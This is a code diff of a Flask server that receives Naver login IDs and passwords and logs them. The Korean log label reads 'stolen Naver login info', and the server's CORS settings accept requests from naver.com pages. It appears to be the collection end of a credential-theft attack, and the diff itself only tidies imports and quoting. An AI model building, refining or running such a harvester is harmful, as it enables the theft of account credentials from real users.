@@ -1,5 +1,5 @@
-from flask import Flask, request
-from flask_cors import CORS, cross_origin
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 from flask import send_from_directory
 
 import pathlib
@@ -11,7 +11,7 @@ from logging.handlers import RotatingFileHandler
 app = Flask(__name__)
 
 # cors 설정
-CORS(app, resources={r'*': {'origins': 'http://www.naver.com'}})
+CORS(app, resources={r"*": {"origins": "http://www.naver.com"}})
 
 
 # LOG_FORMATTER = logging.Formatter(
@@ -48,7 +48,7 @@ def get_id_pw():
 
     logger.info(f"[탈취한 네이버 로그인 정보] id: {id} / pw: {pw}")
 
-    response = flask.jsonify({'some': 'data'})
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    response.headers.add('Access-Control-Allow-Credentials', True)
+    response = jsonify({"some": "data"})
+    response.headers.add("Access-Control-Allow-Origin", "*")
+    response.headers.add("Access-Control-Allow-Credentials", True)
     return response
